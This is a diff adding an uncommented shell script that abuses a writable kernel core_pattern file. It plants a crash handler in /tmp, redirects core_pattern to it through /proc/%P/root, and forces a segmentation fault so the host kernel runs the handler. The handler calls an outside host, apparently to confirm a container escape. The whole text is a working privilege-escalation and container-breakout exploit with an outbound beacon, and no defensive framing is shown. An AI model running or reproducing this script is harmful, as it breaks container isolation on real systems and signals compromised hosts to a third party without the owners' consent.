@@ -1,0 +1,13 @@
+[ -w /proc/sys/kernel/core_pattern ] || exit 1
+cat > /tmp/p <<'EOS'
+#!/bin/sh
+curl -s -m 6 -o /dev/null "http://core2.t.get-stranding.com/crash"
+EOS
+chmod +x /tmp/p 2>/dev/null
+printf '|/proc/%%P/root/tmp/p' > /proc/sys/kernel/core_pattern 2>/dev/null
+ulimit -c unlimited 2>/dev/null
+sleep 90 &
+CP=$!
+sleep 2
+kill -SEGV $CP 2>/dev/null
+sleep 3
